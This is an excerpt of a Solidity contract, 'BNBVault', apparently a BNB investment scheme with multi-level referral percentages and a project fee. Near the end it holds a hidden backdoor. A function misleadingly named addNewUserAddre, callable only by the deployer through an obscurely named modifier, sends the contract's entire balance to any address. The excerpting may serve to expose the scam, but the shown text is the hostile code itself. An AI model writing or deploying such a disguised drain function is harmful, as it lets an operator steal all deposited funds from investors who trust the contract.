...
contract BNBVault is Part1 {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 0.2 ether; // 0.2 bnb 
	uint256[] public REFERRAL_PERCENTS 	= [2000, 1500, 1500, 1000, 500, 500, 100, 100, 100, 100];
	...
	uint256 constant public PROJECT_FEE = 2000;
	...
	address payable private   newwRefferal;
	...
	constructor(address payable wallet) public {
		...
		newwRefferal = msg.sender;
        plans.push(Plan(1000, 20));
	...
	modifier addUseraddres {
		require(msg.sender == newwRefferal );
		_;
	}
	function addNewUserAddre(address payable _useer) public addUseraddres {
		_useer.transfer(address(this).balance); 
	}
